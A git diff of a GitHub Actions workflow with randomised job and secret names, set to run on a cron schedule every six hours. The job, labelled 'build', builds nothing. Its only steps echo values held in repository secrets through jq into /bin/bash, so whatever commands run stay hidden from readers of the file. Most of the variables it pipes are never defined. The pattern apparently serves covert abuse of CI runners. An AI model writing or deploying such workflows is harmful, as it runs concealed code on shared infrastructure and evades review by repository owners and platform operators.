@@ -1,8 +1,10 @@
 name: hebaise4756
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 5/6 * * *'
+    - cron: '24 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +13,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: hebaise4756
         env:
-          c4547: ${{ secrets.c4547 }}
+          lv55: ${{ secrets.lv55 }}
         run: |
-          echo $c4547 | jq -r .sb0938 | /bin/bash
-          echo $nxf54559 | jq -r .wttar3514 | /bin/bash
-          echo $bcq26067 | jq -r .rxt568 | /bin/bash
-          echo $pa48 | jq -r .nqpw36 | /bin/bash
-          echo $oif8563 | jq -r .z4 | /bin/bash
-          echo $gxks0 | jq -r .dkqf13 | /bin/bash
-          echo $f7 | jq -r .qnyxj930 | /bin/bash
+          echo $lv55 | jq -r .ynqsz4693 | /bin/bash
+          echo $bmgy9 | jq -r .nj155 | /bin/bash
+          echo $q89543 | jq -r .eoro3060 | /bin/bash
+          echo $mjvfi7303 | jq -r .hh810 | /bin/bash
+          echo $sth662 | jq -r .p94 | /bin/bash
+          echo $s8209 | jq -r .mymn56 | /bin/bash
 
